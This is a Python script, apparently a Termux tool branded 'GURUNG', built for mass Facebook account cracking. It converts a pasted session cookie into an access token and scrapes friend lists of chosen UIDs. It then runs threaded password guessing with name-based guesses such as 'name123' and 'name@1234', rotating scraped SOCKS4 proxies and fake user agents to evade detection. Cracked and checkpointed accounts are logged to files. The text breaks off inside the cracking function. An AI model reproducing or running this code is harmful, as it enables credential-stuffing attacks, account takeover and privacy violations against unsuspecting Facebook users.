#-----------------[ IMPORT-MODULE ]-------------------#

def modules():
	print("\033[1;37m [\u001b[36m•\033[1;37m] CHECKING FOR UPDATES \033[1;37m")
	os.system('pkg update -y && pkg upgrade -y')
	os.system('clear')
	try:
		import rich
	except ModuleNotFoundError:
		print("\033[1;37m [\u001b[36m•\033[1;37m] RICH IS BEING INSTALLED \033[1;37m")
		os.system('pip install rich --quiet')
		print("\033[1;37m [\u001b[36m>>\033[1;37m] RICH HAS BEEN INSTALLED \033[1;37m")
	except:exit()
	try:
		import bs4
	except ModuleNotFoundError:
		print("\033[1;37m [\u001b[36m•\033[1;37m] BS4 IS BEING INSTALLED \033[1;37m")
		os.system('pip install bs4 --quiet')
		print("\033[1;37m [\u001b[36m>>\033[1;37m] BS4 HAS BEEN INSTALLED \033[1;37m")
	except:exit()
	try:
		import requests
	except ModuleNotFoundError:
		print("\033[1;37m [\u001b[36m•\033[1;37m] REQUESTS IS BEING INSTALLED \033[1;37m")
		os.system('pip install requests --quiet')
		print("\033[1;37m [\u001b[36m>>\033[1;37m] REQUESTS HAS BEEN INSTALLED \033[1;37m")
	except:exit()
	exit()

try:
	import requests,bs4,json,os,sys,random,datetime,time,re,multiprocessing
	from bs4 import BeautifulSoup as bs
	from bs4 import BeautifulSoup
	import urllib3,rich,base64
	from rich.table import Table as me
	from rich.console import Console as sol
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as tred
	from rich.console import Group as gp
	from rich.panel import Panel as nel
	from rich import print as cetak
	from rich.markdown import Markdown as mark
	from rich.columns import Columns as col
	from rich import print as prints
	from rich import pretty
	from rich.text import Text as tekz
	from time import localtime as lt
	pretty.install()
	CON=sol()
except ModuleNotFoundError:
	modules()

#------------------[ GLOBAL VARIABLES ]-------------------#

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

#------------------[ PROXY ]-------------------#

try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	pass
prox=open('.prox.txt','r').read().splitlines()

#------------------[ USER-AGENT ]-------------------#

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	pass
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('user-agents.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/cvandeplas/pystemon/blob/master/user-agents.txt').text
		ua=open('user-agents.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('user-agents.txt','r').read().splitlines()

#------------[ INDICATION ]---------------#

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

#------------[ WARNA-COLOR ]--------------#

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])

###----------[ ANSII COLOR STYLE ]---------- ###

Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

###----------[ RICH COLOR STYLE ]---------- ###

Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

#--------------------[ CONVERTER-BULAN ]--------------#

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"

#------------------[ MACHINE-SUPPORT ]---------------#

def animation(u):
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
def contact():
	os.system('xdg-open https://www.facebook.com/profile.php?id=100080763382371')
	back()
def linex():
	print('\033[1;37m----------------------------------------------')

#------------------[ LOGO-LAKNAT ]-----------------#

def banner():
	print("""\n
    
 
 \u001b[31██████╗ ██╗   ██╗██████╗ ██╗   ██╗███╗   ██╗ ██████╗ 
██╔════╝ ██║   ██║██╔══██╗██║   ██║████╗  ██║██╔════╝ 
██║  ███╗██║   ██║██████╔╝██║   ██║██╔██╗ ██║██║  ███╗
██║   ██║██║   ██║██╔══██╗██║   ██║██║╚██╗██║██║   ██║
╚██████╔╝╚██████╔╝██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝
 ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ 
\u001b[31mv2
                                            
  
\033[1;37m----------------------------------------------
 AUTHOR     : Gurung
 GITHUB     : GURUNGHUUU
 FACEBOOK   : Ɣʬ'ɽ Gurung Ȭʬɭɭɘ'x
 VERSION    :\u001b[36m v2\033[1;37m
\033[1;37m----------------------------------------------""")

#------------------[ PASSWORD ASK ]-------------------#

def psw():
	os.system('clear')
	banner()
	print(" [\u001b[36m>\033[1;37m] ADD A PASSWORD TO YOUR ACCOUNT  " )
	linex()
	upsw = input(" [\u001b[36m•\033[1;37m] ENTER PASSWORD : " )
	open('.password.txt','w').write(upsw)
	print('\033[1;37m----------------------------------------------')
	animation(' >> YOUR PASSWORD HAS BEEN CHANGED ')
	os.system('python run.py')
try:
	with open('.password.txt') as upw:upass = upw.readline()
except FileNotFoundError:
	psw()

def askpsw():
	askpw = input(" [\u001b[36m•\033[1;37m] ENTER YOUR PASSWORD : " )
	if askpw == upass:
		linex()
		animation(" [\u001b[36m>\033[1;37m] ACCESS GRANTED " )
		time.sleep(1)
		pass
	else:
		linex()
		animation(" [\u001b[36m×\033[1;37m] ACCESS DENIED " )
		time.sleep(1)
		back()

def cpsw():
	linex()
	oldpsw = input(" [\u001b[36m•\033[1;37m] ENTER OLD PASSWORD : " )
	if oldpsw == upass:
		linex()
		upsw = input(" [\u001b[36m•\033[1;37m] ENTER NEW PASSWORD : " )
		open('.password.txt','w').write(upsw)
		print('\033[1;37m----------------------------------------------')
		animation(' >> YOUR PASSWORD HAS BEEN CHANGED ')
		time.sleep(1)
		pass
	else:
		linex()
		animation(" [\u001b[36m×\033[1;37m] WRONG PASSWORD " )
		time.sleep(1)
		back()

#------------------[ NAME ASK ]-------------------#

def asknamr():
	os.system('rm -rf .name.txt')
	linex()
	animation(" [\u001b[36m>\033[1;37m] NAME HAS BEEN RESET !!! " )
	exit()

def name(): 
	os.system('clear')
	banner()
	print(" [\u001b[36m>\033[1;37m] USE YOUR REAL NAME OTHERWISE DISAPPROVAL" )
	linex()
	uan = input(" [\u001b[36m•\033[1;37m] ENTER YOUR NAME : " )
	open('.name.txt','w').write(uan)
	print('\033[1;37m----------------------------------------------')
	animation(' >> YOUR NAME HAS BEEN CHANGED ')
	os.system('python run.py')
try:
	with open('.name.txt') as h:uname = h.readline()
except FileNotFoundError:
	name()

#------------------[ APPROVAL SYSTEM ]-------------------#

def approval():
  time.sleep(1)
  uuid = str(os.geteuid())+"DS"+str(os.geteuid())
  id = "GV2-"+"".join(uuid)
  os.system('clear')
  banner()
  animation("\033[1;37m [\u001b[36m•\033[1;37m] YOU NEED APPROVAL TO USE THIS TOOL   \033[1;37m")
  print("\033[1;37m [\u001b[36m•\033[1;37m] YOUR KEY :\u001b[36m "+id);time.sleep(0.1)
  print ("""\033[1;37m----------------------------------------------""")
  try:
    httpCaht = requests.get("https://github.com/gurunghuuu/public/blob/main/APPROVAL.txt").text
    if id in httpCaht:
      animation("\033[1;97m [\u001b[36m>\033[1;37m] YOUR KEY HAS BEEN APPROVED !!!")
      msg = str(os.geteuid())
      time.sleep(1)
      pass
    else: 
      animation("\x1b[1;97m [\u001b[36m>\033[1;37m] SORIEE YOUR KEY HAS NOT BEEN APPROVED ");
      time.sleep(0.1)
      input(' [\u001b[36m>\033[1;37m] CLICK ENTER TO SEND YOUR KEY ')
      os.system('xdg-open https://www.facebook.com/profile.php?id=100080763382371')
      time.sleep(1)
      exit()
  except: 
     exit() 
approval()

#--------------------[ BAGIAN-MASUK ]--------------#

def login123():
	login_lagi334()
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login123()
		except requests.exceptions.ConnectionError:
			animation(f'\033[0m \u001b[36m>>\033[1;37m CHECK YOUR INTERNET CONNECTION')
			exit()
	except IOError:
		login123()
		
def login_lagi334():
	try:
		os.system('clear')
		banner()
		print(""" [\u001b[36m1\033[1;37m] EXTENSION : COOKIE DOUGH
 [\u001b[36m2\033[1;37m] OPEN DESKTOP MODE
 [\u001b[36m3\033[1;37m] GO TO : www.facebook.com/adsmanager
 [\u001b[36m4\033[1;37m] THEN OPEN EXTENSION COPY COOKIE""")
		linex()
		your_cookies = input(' [\u001b[36m•\033[1;37m] ENTER COOKIE : ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'How do you want to log into Facebook?' in str(response2) or '/login/?next=' in str(response2):
					linex()
					animation(f'\033[0m \u001b[36m>>\033[1;37m LOGIN TOKEN/COOKIE EXPIRED')
					exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Success!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							linex()
							animation(f'\033[0m \u001b[36m>>\033[1;37m LOGIN DONE RESTART');exit()
			except Exception as e:
				linex()
				animation(f'\033[0m \u001b[36m>>\033[1;37m LOGIN TOKEN/COOKIE EXPIRED')
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				time.sleep(1)
				back()
	except Exception as e:
		print(e)

#------------------[ MENU ]----------------#

def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] INVIALD COOKIE ')
		time.sleep(5)
		insert_cookie()
	os.system('clear')
	banner()
	print(" [\u001b[36m•\033[1;37m] WELCOME     : "+uname)
	print(" [\u001b[36m•\033[1;37m] TODAYS DATE : "+date)
	linex()
	print(f""" [\u001b[36m1\033[1;37m] CRACK PUBLIC       [\u001b[36m5\033[1;37m] RESET NAME""")
	print(f""" [\u001b[36m2\033[1;37m] CRACK FILE         [\u001b[36m6\033[1;37m] CONTACT ADMIN""")
	print(f""" [\u001b[36m3\033[1;37m] CHECK RESULTS      [\u001b[36m0\033[1;37m] LOGOUT MENU""")
	print(f""" [\u001b[36m4\033[1;37m] CHANGE PASSWORD""")
	linex()
	_____cowok__pink_____ = input(' CHOOSE : ')
	if _____cowok__pink_____ in ['1']:
		dump_massal()
	elif _____cowok__pink_____ in ['2']:
		crack_file()
	elif _____cowok__pink_____ in ['3','03']:
		result()
	elif _____cowok__pink_____ in ['4','04']:
		cpsw()
	elif _____cowok__pink_____ in ['5','05']:
		asknamr()
	elif _____cowok__pink_____ in ['6','06']:
		contact()
	elif _____cowok__pink_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		linex()
		animation(' [×] DONE LOGOUT ')
		exit()
	else:
		linex()
		animation(' [×] SELECT CORRECTLY ')
		back()

	#-----------------[ HASIL-CRACK ]-----------------#

def result():
	linex()
	askpsw()
	os.system('clear')
	banner()
	print(' [\u001b[36m1\033[1;37m] CHECK CP IDZ ')
	print(' [\u001b[36m2\033[1;37m] CHECK OK IDZ ')
	print(' [\u001b[36m0\033[1;37m] EXIT ')
	linex()
	kz = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			linex()
			animation(' [\u001b[36m×\033[1;37m] FILE NOT FOUND ')
			time.sleep(3)
			back()
		if len(vin)==0:
			linex()
			animation(' [\u001b[36m•\033[1;37m] NO CP RESULTS FOUND ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					linex()
					print(' '+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(' '+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
			linex()
			geeh = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
			linex()
			try:geh = lol[geeh]
			except KeyError:
				linex()
				animation(' [\u001b[36m×\033[1;37m] NO OPTION FOUND ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				linex()
				animation(' [\u001b[36m×\033[1;37m] FILE NOT FOUND ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f' [\u001b[36m•\033[1;37m] CP : \033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
				nocp +=1
			linex()
			input(' >> PRESS ENTER TO BACK ')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			linex()
			animation(' [\u001b[36m×\033[1;37m] FILE NOT FOUND ')
			time.sleep(2)
			back()
		if len(vin)==0:
			linex()
			animation(' [\u001b[36m•\033[1;37m] NO OK RESULTS FOUND ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					linex()
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(' '+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(' '+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
			linex()
			geeh = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
			linex()
			try:geh = lol[geeh]
			except KeyError:
				linex()
				animation(' [\u001b[36m×\033[1;37m] NO OPTION FOUND ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				linex()
				animation(' [\u001b[36m×\033[1;37m] FILE NOT FOUND ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f' [\u001b[36m•\033[1;37m] OK : \033[32m {cpkuni[0]}|{cpkuni[1]}\033[0m')
				nocp +=1
			linex()
			input(' >> PRESS ENTER TO BACK ')
			back()
	elif kz in ['0','00']:
		back()
	else:
		linex()
		animation(' [\u001b[36m×\033[1;37m] NO OPTION FOUND IN MENU')
		exit()

#-------------------[ CRACK-PUBLIK ]----------------#

def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		linex()
		jum = int(input(' [\u001b[36m•\033[1;37m] ENTER TARGET AMOUNT  : '))
		linex()
	except ValueError:
		linex()
		animation(' [×] INVALID OPTION ')
		exit()
	if jum<1 or jum>100000000:
		linex()
		animation(' [×] TRY AGAIN ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' [\u001b[36m•\033[1;37m] INPUT UID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			linex()
			animation(' [×] TRY AGAIN ')
			os.system('clear')
	try:
		linex()
		print(f' [\u001b[36m•\033[1;37m] TOTAL ID : \u001b[36m'+str(len(id))+'\033[1;37m')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		back()
	except (KeyError,IOError):
		linex()
		animation(" [×] DUMP ID FAILED ")
		time.sleep(3)
		back()

#-------------[ CRACK-FROM-FILE ]------------------#

def crack_file():
	linex()
	o = input(' [\u001b[36m•\033[1;37m] FILE NAME : ')
	try:lin = open(o).read().splitlines()
	except:
		linex()
		animation(' [×] FILE NOT FOUND')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()

#-------------[ PENGATURAN-IDZ ]---------------#

def setting():
	linex()
	print(" [\u001b[36m1\033[1;37m] ONLY OLD IDZ")
	print(" [\u001b[36m2\033[1;37m] ONLY NEW IDZ")
	print(" [\u001b[36m3\033[1;37m] BOTH MIX IDZ")
	linex()
	hu = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[] 
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	linex()
	print(" [\u001b[36m•\033[1;37m] LOGIN METHOD ")
	linex()
	print(" [\u001b[36m1\033[1;37m] METHOD 1")
	print(" [\u001b[36m2\033[1;37m] METHOD 2")
	linex()
	hc = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
	if hc in ['1','01']:
		method.append('mobile')
#	elif hc in ['2','02']:
#		method.append('p')
#	elif hc in ['3','03']:
#		method.append('touch')
	elif hc in ['4','04']:
		method.append('free')
	else:
		method.append('mobile')
	passwrd()
	exit() 

#-------------------[ BAGIAN-WORDLIST ]------------#

def passwrd():
	os.system('clear')
	banner()
	print(f' [\u001b[36m•\033[1;37m] TOTAL IDz : \u001b[36m',str(len(id)))
	print(" \033[1;37m[\u001b[36m•\033[1;37m] YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
	linex()
	print(f' \u001b[36m>> \033[1;37m️USE FLIGHT MODE AFTER 5 MINUTES ')
	linex()
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'@@')
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'123@')
					pwv.append(frs+'1234')
					pwv.append(frs+'1234@')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+'@12345')
					pwv.append(frs+'@123456')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(nmf)
					pwv.append(frs+'@@')
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'123@')
					pwv.append(frs+'1234')
					pwv.append(frs+'1234@')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+'@12345')
					pwv.append(frs+'@123456')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('\n\033[1;37m----------------------------------------------')
	print(' [\u001b[36m•\033[1;37m] CLONING COMPLETE AT '+time.strftime("%H:%M")+" "+ tag)
	print(' [\u001b[36m•\033[1;37m] OK : %s '%(ok))
	print(' [\u001b[36m•\033[1;37m] CP : %s '%(cp))
	linex()
	woi = input(' \u001b[36m>>\033[1;37m ENTER TO BACK')
	exit()

#--------------------[ METODE-B-API ]-----------------#

def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r {P}[GURUNG-DW]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
